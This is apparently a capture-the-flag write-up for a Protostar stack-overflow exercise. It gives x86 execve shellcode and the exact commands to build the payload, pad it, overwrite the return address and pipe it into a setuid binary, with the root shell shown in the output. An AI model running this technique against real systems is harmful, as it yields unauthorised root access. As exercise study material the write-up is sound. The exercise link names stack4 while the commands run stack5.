## Description

[Problem source](https://exploit-exercises.com/protostar/stack4/)


### Solution

This level is considerably harder than the previous ones. In order to solve this
problem we'll need to create our own custom binary snippet, called the
`shellcode`, that we'll inject on the stack in order to execute `execve` and get
the shell access through the SETUID program.

We already know from the previous levels, that we can jump on an arbitrary
address in our program. This means that, if the stack is executable, we can jump
onto the stack as well. We can overflow the buffer with the machine code that
will execute execve and jump on that address. In real world this won't be
possible because stack in most cases is not executable and also ASLR assigns
random address to the stack, making it nearly impossible to guess the address of
our machine code.

Let's start by writing the execve shellcode:
	
	.section .text
	 _start:
	         mov $0x0b, %eax
	         lea -0x3b(%esp), %ebx #program string
	         mov $0, %ecx
	         mov $0, %edx
	         int $0x80
	 program:
	         .asciz "/bin/sh"

Compile and link it.

	as injection.S -o inj.o
	ld inj.o -o inj

Extract naked binary from ELF:

	objcopy -O binary inj inj.bin
	wc -c inj.bin

The size of our naked binary is 29 bytes. The distance between buffer and the
return address is 76 bytes. So we'll need to add 76 - 29 = 47 bytes of padding

	python -c "print('a' * 47)" >>inj.bin

Now at this point we need to know what is the absolute address of our buffer on
the stack, so we can overwrite the return pointer with that address. Using `gdb`
and running the program in the shell will provide different addresses because,
these two programs will run in different environments. As environmental
variables are pushed on the stack, if the size of env variables differ, so will
the address of our buffer. To mitigate this problem we can either add `nop`
paddings at the beginning of our code and expect that our `gdb` environment is
smaller than the one that the shell provides or we can ensure that we'll run our
program in the same environment as `gdb`. The $_ $PWD $OLDPWD and argv[0] should
be same in `gdb` and shell, and most likely our addresses will the same. In my
case the address is `0xbffff750`, so I'll add the address to my injection file.

	python -c "print('\x50\xf7\xff\xbf')" >>inj.bin

Next challenge is providing the program with an input. If we use the simple
pipe, it won't work as our first program will consume all the data from the pipe
and won't leave anything for bash and bash, not seeing any input on the
stdin, will simply quit. One solution to that problem is to create a named
pipe.and using `tail -f` to keep the shell from exiting.

	mkfifo fifo_tmp
	tail -c 100 -f ~/fifo_tmp | /opt/protostar/bin/stack5
	cat inj.bin >>fifo_tmp
	echo "whoami" >>fifo_tmp
		root
	echo "anycommand" >>fifo_tmp



## Lessons learned

gets stops reading after newline or null char, so the string `/bin/bash` should
be the last. (should check)

